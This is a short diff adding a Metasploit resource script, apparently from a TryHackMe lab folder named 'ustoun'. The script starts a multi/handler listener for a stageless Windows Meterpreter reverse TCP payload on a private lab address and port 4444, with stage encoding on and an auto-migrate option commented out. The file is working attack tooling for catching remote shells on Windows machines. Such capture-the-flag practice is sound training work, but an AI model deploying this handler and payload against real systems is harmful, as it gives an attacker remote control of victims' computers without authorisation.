@@ -1,0 +1,11 @@
+#
+# [Kali]: msfdb start; msfconsole -q -r '/home/garrett/Documents/thm/ustoun/windows-meterpreter-stageless-reverse-tcp-4444-ps1.rc'
+#
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter_reverse_tcp
+set LHOST 10.6.12.78
+set LPORT 4444
+set ExitOnSession false
+set EnableStageEncoding true
+#set AutoRunScript 'post/windows/manage/migrate'
+run -j
